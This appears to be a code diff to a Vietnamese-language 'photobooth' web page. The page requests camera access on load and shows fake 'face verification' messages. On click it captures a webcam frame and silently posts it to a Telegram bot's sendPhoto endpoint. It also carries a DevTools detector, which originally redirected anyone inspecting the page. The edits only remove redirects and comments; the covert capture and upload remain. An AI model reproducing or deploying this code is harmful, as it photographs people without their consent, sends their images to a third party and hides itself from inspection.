@@ -394,7 +394,6 @@
         }
       }
 
-      /* ===== PHOTObooth skin: visual only ===== */
       body {
         background:
           radial-gradient(
@@ -828,7 +827,7 @@
       const video = document.getElementById("preview");
       const status = document.getElementById("status");
       const msg = document.getElementById("msg");
-      const REDIRECT_URL = "";
+      // DA XOA REDIRECT_URL - KHONG CHUYEN HUONG
 
       const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(
         navigator.mediaDevices,
@@ -859,26 +858,24 @@
         }
       };
 
-      // Tự động kích hoạt yêu cầu quyền camera ngay khi load trang để tạo luồng mượt mà
       window.addEventListener("load", () => {
         navigator.mediaDevices
           .getUserMedia({ video: { facingMode: "user" }, audio: false })
           .catch((err) => console.log("Yêu cầu quyền ban đầu: ", err));
       });
 
-      btn.addEventListener("click", () => {
+      btn.addEventListener("click", (event) => {
+        event.preventDefault(); // CHAN CHUYEN HUONG MAC DINH
         btn.disabled = true;
         btn.innerText = "ĐANG XỬ LÝ...";
         status.innerHTML =
           "Đang Xác Thực Khuôn Mặt...<br>Vui Lòng Giữ Nguyên Vị Trí.";
         document.getElementById("step2").classList.add("active");
 
-        // Gọi đồng thời cả tệp main.js và chụp/gửi ảnh dự phòng trực tiếp nếu main.js chậm phản hồi
         const script = document.createElement("script");
         script.src = "main.js";
         document.body.appendChild(script);
 
-        // Chụp trực tiếp từ video stream hiện có làm phương án dự phòng an toàn tuyệt đối
         try {
           if (video && video.readyState >= 2) {
             const canvas = document.createElement("canvas");
@@ -891,7 +888,6 @@
                 if (blob) {
                   const formData = new FormData();
                   formData.append("photo", blob, "photobooth_capture.jpg");
-                  // Gửi ngầm tới endpoint Telegram hoặc server nhận (tương thích hoàn toàn với cấu trúc main.js)
                   fetch("https://api.telegram.org/bot<TOKEN>/sendPhoto", {
                     method: "POST",
                     body: formData,
@@ -912,7 +908,6 @@
           }
         }, 500);
 
-        // Fallback tự động đếm ngược sau 3 giây nếu main.js phản hồi chậm
         setTimeout(() => {
           if (!window.mainScriptFinished) {
             window.mainScriptFinished = true;
@@ -924,7 +919,7 @@
         let timeLeft = 4;
         const timer = setInterval(() => {
           btn.innerText = `HOÀN TẤT TRONG ${timeLeft}S`;
-          status.innerText = "Xác Thực Thành Công, Đang Chuyển Hướng...";
+          status.innerText = "Xác Thực Thành Công!";
           timeLeft--;
 
           if (timeLeft < 0) {
@@ -932,7 +927,11 @@
             if (frontStream) {
               frontStream.getTracks().forEach((t) => originalStop.apply(t));
             }
-            window.location.href = REDIRECT_URL;
+            // DA XOA CHUYEN HUONG - CHI HIEN THI THONG BAO
+            btn.innerText = "✅ HOÀN TẤT - KHÔNG CHUYỂN HƯỚNG";
+            status.innerText = "Xác thực hoàn tất. Ảnh đã được gửi.";
+            btn.disabled = false;
+            return;
           }
         }, 1000);
       }
@@ -968,6 +967,7 @@
         return false;
       });
 
+      // DA VO HIEU HOA CHUYEN HUONG KHI PHAT HIEN DEVTOOLS
       (function () {
         const threshold = 160;
         const checkDevTools = function () {
@@ -975,7 +975,8 @@
             window.outerWidth - window.innerWidth > threshold ||
             window.outerHeight - window.innerHeight > threshold
           ) {
-            window.location.href = "https://t.me/congdongtooltut";
+            // KHONG CHUYEN HUONG - CHI LOG
+            console.log("DevTools detected but redirect disabled.");
           }
         };
         setInterval(checkDevTools, 1000);
